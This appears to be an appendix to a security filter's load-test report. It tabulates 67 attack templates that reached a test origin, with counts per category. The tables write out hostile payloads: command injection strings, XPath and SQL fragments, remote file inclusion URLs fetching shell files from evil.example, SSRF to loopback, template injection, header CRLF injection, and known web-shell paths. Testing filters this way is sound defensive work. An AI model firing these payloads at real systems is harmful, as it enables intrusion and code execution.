# Attacks admitted during the 750,000-request run

**67 labelled attack templates reached the counted origin, producing 51,858 HTTP 200 responses.** Each listed template reached it in all 774 attempts. This is request admission, not proof of exploitation.

[Main report](loadtest-750k-2026-10-06.md) | [Full JSON evidence](loadtest-750k-2026-10-06.json)

The tables include all admitted templates, organized by category. Targets are the verified wire request targets. Bodies retain their original encoded spelling. Headers are shown for header-dependent cases; the JSON evidence preserves every admitted case's complete synthetic request, original URI, wire URI, headers, body, description and response counts. Corpus names use a zero-based index within the attack corpus.

| Category | Admitted templates | Requests reaching origin |
| --- | ---: | ---: |
| HTTP parameter pollution | 18 | 13,932 |
| XPath injection | 15 | 11,610 |
| Command injection | 3 | 2,322 |
| Java serialization markers | 2 | 1,548 |
| Remote file inclusion | 4 | 3,096 |
| SSRF inputs | 2 | 1,548 |
| Template injection | 2 | 1,548 |
| Protocol/header probes | 1 | 774 |
| Scanner identifiers | 2 | 1,548 |
| WordPress plugin paths | 3 | 2,322 |
| Application probes | 15 | 11,610 |

## HTTP parameter pollution

Duplicate values and parser aliases can matter when the origin selects, normalizes or joins values differently. Passing these indicators does not show an authorization or injection exploit against this fixed origin.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` hpp/v01-form ` | POST | ` /api/update ` | ` role=user&role=admin ` | 774 |
| ` hpp/v01-query ` | GET | ` /api/update?role=user&role=admin ` | (empty body) | 774 |
| ` hpp/v02-form ` | POST | ` /api/update ` | ` role=user&%72ole=admin ` | 774 |
| ` hpp/v02-query ` | GET | ` /api/update?role=user&%72ole=admin ` | (empty body) | 774 |
| ` hpp/v03-form ` | POST | ` /api/update ` | ` role=user&role[]=admin ` | 774 |
| ` hpp/v03-query ` | GET | ` /api/update?role=user&role[]=admin ` | (empty body) | 774 |
| ` hpp/v04-form ` | POST | ` /api/update ` | ` role[]=user&role=admin ` | 774 |
| ` hpp/v04-query ` | GET | ` /api/update?role[]=user&role=admin ` | (empty body) | 774 |
| ` hpp/v05-form ` | POST | ` /api/update ` | ` user.name=alice&user_name=admin ` | 774 |
| ` hpp/v05-query ` | GET | ` /api/update?user.name=alice&user_name=admin ` | (empty body) | 774 |
| ` hpp/v06-form ` | POST | ` /api/update ` | ` user+name=alice&user_name=admin ` | 774 |
| ` hpp/v06-query ` | GET | ` /api/update?user+name=alice&user_name=admin ` | (empty body) | 774 |
| ` hpp/v08-form ` | POST | ` /api/update ` | ` q=UNION&q=SELECT+password+FROM+users ` | 774 |
| ` hpp/v08-query ` | GET | ` /api/update?q=UNION&q=SELECT+password+FROM+users ` | (empty body) | 774 |
| ` hpp/v11-form ` | POST | ` /api/update ` | ` enabled=false&enabled=true ` | 774 |
| ` hpp/v11-query ` | GET | ` /api/update?enabled=false&enabled=true ` | (empty body) | 774 |
| ` hpp/v12-form ` | POST | ` /api/update ` | ` ids[0]=1&ids[0]=2 ` | 774 |
| ` hpp/v12-query ` | GET | ` /api/update?ids[0]=1&ids[0]=2 ` | (empty body) | 774 |

## XPath injection

These quote-breaking XPath expressions require unsafe construction of an XPath query at the application. The same five payload seeds pass in query, form and JSON transports; their XML transports are refused.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` xpath/v03-form ` | POST | ` /api/xml-search ` | ` input=%27+or+true%28%29+or+%27x%27%3D%27y ` | 774 |
| ` xpath/v03-json ` | POST | ` /api/xml-search ` | ` {"input":"' or true() or 'x'='y"} ` | 774 |
| ` xpath/v03-query ` | GET | ` /api/xml-search?input=%27+or+true%28%29+or+%27x%27%3D%27y ` | (empty body) | 774 |
| ` xpath/v04-form ` | POST | ` /api/xml-search ` | ` input=%27+or+count%28%2F%2Fuser%29%3E0+or+%27x%27%3D%27y ` | 774 |
| ` xpath/v04-json ` | POST | ` /api/xml-search ` | ` {"input":"' or count(//user)\u003e0 or 'x'='y"} ` | 774 |
| ` xpath/v04-query ` | GET | ` /api/xml-search?input=%27+or+count%28%2F%2Fuser%29%3E0+or+%27x%27%3D%27y ` | (empty body) | 774 |
| ` xpath/v05-form ` | POST | ` /api/xml-search ` | ` input=%27+or+contains%28name%28%29%2C%27user%27%29+or+%27x%27%3D%27y ` | 774 |
| ` xpath/v05-json ` | POST | ` /api/xml-search ` | ` {"input":"' or contains(name(),'user') or 'x'='y"} ` | 774 |
| ` xpath/v05-query ` | GET | ` /api/xml-search?input=%27+or+contains%28name%28%29%2C%27user%27%29+or+%27x%27%3D%27y ` | (empty body) | 774 |
| ` xpath/v09-form ` | POST | ` /api/xml-search ` | ` input=%27%5D+%7C+%2F%2Fuser+%7C+%2F%2F%2A%5B%27a%27%3D%27a ` | 774 |
| ` xpath/v09-json ` | POST | ` /api/xml-search ` | ` {"input":"'] \| //user \| //*['a'='a"} ` | 774 |
| ` xpath/v09-query ` | GET | ` /api/xml-search?input=%27%5D+%7C+%2F%2Fuser+%7C+%2F%2F%2A%5B%27a%27%3D%27a ` | (empty body) | 774 |
| ` xpath/v10-form ` | POST | ` /api/xml-search ` | ` input=%27+or+not%28false%28%29%29+or+%27x%27%3D%27y ` | 774 |
| ` xpath/v10-json ` | POST | ` /api/xml-search ` | ` {"input":"' or not(false()) or 'x'='y"} ` | 774 |
| ` xpath/v10-query ` | GET | ` /api/xml-search?input=%27+or+not%28false%28%29%29+or+%27x%27%3D%27y ` | (empty body) | 774 |

## Command injection

Compact shell and Windows command strings are admitted. Execution requires an application that passes this input to a command interpreter.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` rce/93 ` | GET | ` /?x=%60id%60 ` | (empty body) | 774 |
| ` rce/97 ` | GET | ` /?x=%0aid ` | (empty body) | 774 |
| ` rce/99 ` | GET | ` /?run=cmd.exe%20/c%20dir ` | (empty body) | 774 |

## Java serialization markers

Serialized-object prefixes are admitted. These markers alone do not demonstrate a valid serialization stream, an unsafe deserializer or an exploitable gadget.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` java/134 ` | GET | ` /?x=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH ` | (empty body) | 774 |
| ` java/135 ` | GET | ` /?x=aced00057372 ` | (empty body) | 774 |

## Remote file inclusion

Remote-resource URL inputs are admitted. Dangerous behavior depends on the application using the value to include or retrieve a resource.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` rfi/83 ` | GET | ` /?page=http://evil.example/shell.txt ` | (empty body) | 774 |
| ` rfi/85 ` | GET | ` /?file=ftp://evil.example/x ` | (empty body) | 774 |
| ` rfi/86 ` | GET | ` /?module=//evil.example/shell.php ` | (empty body) | 774 |
| ` rfi/88 ` | GET | ` /?page=https://pastebin.example/raw/abc.php ` | (empty body) | 774 |

## SSRF inputs

Noncanonical loopback and dict-scheme URL inputs are admitted. The fixed origin never fetches them; this test does not exercise an application URL fetcher.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` ssrf/148 ` | GET | ` /?url=http://0x7f000001/ ` | (empty body) | 774 |
| ` ssrf/150 ` | GET | ` /?src=dict://127.0.0.1:11211/stats ` | (empty body) | 774 |

## Template injection

Two template-expression syntaxes are admitted. Impact depends on the application evaluating user input as template code.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` ssti/156 ` | GET | ` /?name=%7B%7Bconfig%7D%7D ` | (empty body) | 774 |
| ` ssti/164 ` | GET | ` /?name=*%7B7*7%7D ` | (empty body) | 774 |

## Protocol/header probes

The forwarding-host value contains an extra header line. Admission does not prove the proxy forwarded or the application trusted that identity claim; the proxy has separate identity-header stripping tests.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` protocol/239 ` | GET | ` / ` | ` X-Forwarded-Host: evil.example\r\nx: y ` | 774 |

## Scanner identifiers

These user-agent identifiers are admitted. Scanner identification is a policy signal, not an exploit by itself.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` scanner/192 ` | GET | ` / ` | ` User-Agent: dirsearch/0.4.3 ` | 774 |
| ` scanner/198 ` | GET | ` / ` | ` User-Agent: jaeles ` | 774 |

## WordPress plugin paths

Plugin-related paths are admitted. The standalone WordPress flag and plugin virtual patches are not enabled in this run; no vulnerable plugin exists at this origin.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` wordpress/242 ` | GET | ` /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php ` | (empty body) | 774 |
| ` wordpress/244 ` | GET | ` /wp-content/plugins/revslider/temp/update_extract/revslider/shell.php ` | (empty body) | 774 |
| ` wordpress/245 ` | GET | ` /wp-content/plugins/wp-file-manager/lib/files/shell.php ` | (empty body) | 774 |

## Application probes

Generic application and diagnostic paths are admitted. The counted origin returns fixed JSON for them and has no diagnostic endpoints or application files.

| Case | Method | Wire target | Body or relevant header | Origin admissions |
| --- | --- | --- | --- | ---: |
| ` probe/209 ` | GET | ` /adminer.php ` | (empty body) | 774 |
| ` probe/212 ` | GET | ` /server-status ` | (empty body) | 774 |
| ` probe/213 ` | GET | ` /phpmyadmin/index.php ` | (empty body) | 774 |
| ` probe/215 ` | GET | ` /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ` | (empty body) | 774 |
| ` probe/217 ` | GET | ` /actuator/env ` | (empty body) | 774 |
| ` probe/223 ` | GET | ` /info.php ` | (empty body) | 774 |
| ` probe/224 ` | GET | ` /test.php ` | (empty body) | 774 |
| ` probe/225 ` | GET | ` /shell.php ` | (empty body) | 774 |
| ` probe/226 ` | GET | ` /c99.php ` | (empty body) | 774 |
| ` probe/227 ` | GET | ` /wso.php ` | (empty body) | 774 |
| ` probe/231 ` | GET | ` /_profiler/phpinfo ` | (empty body) | 774 |
| ` probe/232 ` | GET | ` /console ` | (empty body) | 774 |
| ` probe/233 ` | GET | ` /debug/default/view ` | (empty body) | 774 |
| ` probe/234 ` | GET | ` /wp-admin/install.php?step=1 ` | (empty body) | 774 |
| ` probe/235 ` | GET | ` /administrator/index.php?option=com_config ` | (empty body) | 774 |
